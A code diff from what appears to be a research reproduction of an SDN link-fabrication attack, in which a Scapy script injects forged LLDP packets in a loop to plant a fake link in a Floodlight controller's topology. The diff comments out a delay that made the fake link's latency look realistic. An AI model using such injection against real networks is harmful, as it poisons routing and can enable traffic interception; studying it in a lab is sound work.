@@ -254,18 +254,18 @@ def main():
     # Step 3 — inject in a loop at the controller's probe rate
     # Paper: "the adversary could tune the LLDP injecting rate to the LLDP
     #         sending rate monitored from the OpenFlow controller"
-    #
-    # Add an artificial delay before re-injection so the fake link's measured
-    # LLDP RTT approximates the real inter-switch link latency (≈ BASE_DELAY_MS
-    # in abilene.py). Without this, fake-link RTT is ~1–5 ms while real links
-    # are ~50 ms, which distorts Floodlight's latency-weighted routing.
-    FAKE_LINK_DELAY = 0.025   # seconds; match BASE_DELAY_MS in abilene.py
-    print(f"\n[*] Injecting forged LLDP every {args.interval}s "
-          f"(+{int(FAKE_LINK_DELAY*1000)}ms artificial latency)  (Ctrl+C to stop)\n")
+    # #
+    # # Add an artificial delay before re-injection so the fake link's measured
+    # # LLDP RTT approximates the real inter-switch link latency (≈ BASE_DELAY_MS
+    # # in abilene.py). Without this, fake-link RTT is ~1–5 ms while real links
+    # # are ~50 ms, which distorts Floodlight's latency-weighted routing.
+    # FAKE_LINK_DELAY = 0.025   # seconds; match BASE_DELAY_MS in abilene.py
+    # print(f"\n[*] Injecting forged LLDP every {args.interval}s "
+    #       f"(+{int(FAKE_LINK_DELAY*1000)}ms artificial latency)  (Ctrl+C to stop)\n")
     count = 0
     try:
         while True:
-            time.sleep(FAKE_LINK_DELAY)
+            # time.sleep(FAKE_LINK_DELAY)
             sendp(pkt, iface=args.iface, verbose=False)
             count += 1
             print(f"    [->] Packets injected: {count}", end="\r", flush=True)
